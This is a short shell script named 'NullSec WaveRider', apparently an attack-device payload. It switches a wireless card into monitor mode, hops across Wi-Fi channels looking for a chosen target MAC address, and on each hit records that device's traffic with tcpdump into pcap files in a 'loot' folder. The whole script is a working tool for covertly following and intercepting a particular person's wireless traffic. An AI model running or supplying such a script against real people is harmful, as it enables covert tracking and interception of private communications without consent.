#!/bin/sh
# NullSec WaveRider - Channel-hopping target pursuit
PAYLOAD_NAME="WaveRider"
TARGET_MAC="${1:-}"
LOOT_DIR="/root/loot/waverider"
mkdir -p "$LOOT_DIR"

if [ -z "$TARGET_MAC" ]; then
    echo "Usage: $0 <target_mac>"
    exit 1
fi

echo "[*] WaveRider pursuing: $TARGET_MAC"
airmon-ng start wlan1 2>/dev/null

while true; do
    for ch in 1 6 11 2 3 4 5 7 8 9 10; do
        iwconfig wlan1mon channel $ch 2>/dev/null
        if timeout 2 tcpdump -i wlan1mon -c 10 2>/dev/null | grep -qi "$TARGET_MAC"; then
            echo "[+] Target on channel $ch!"
            timeout 30 tcpdump -i wlan1mon ether host $TARGET_MAC -w "$LOOT_DIR/cap_${ch}_$(date +%s).pcap" 2>/dev/null
        fi
    done
done
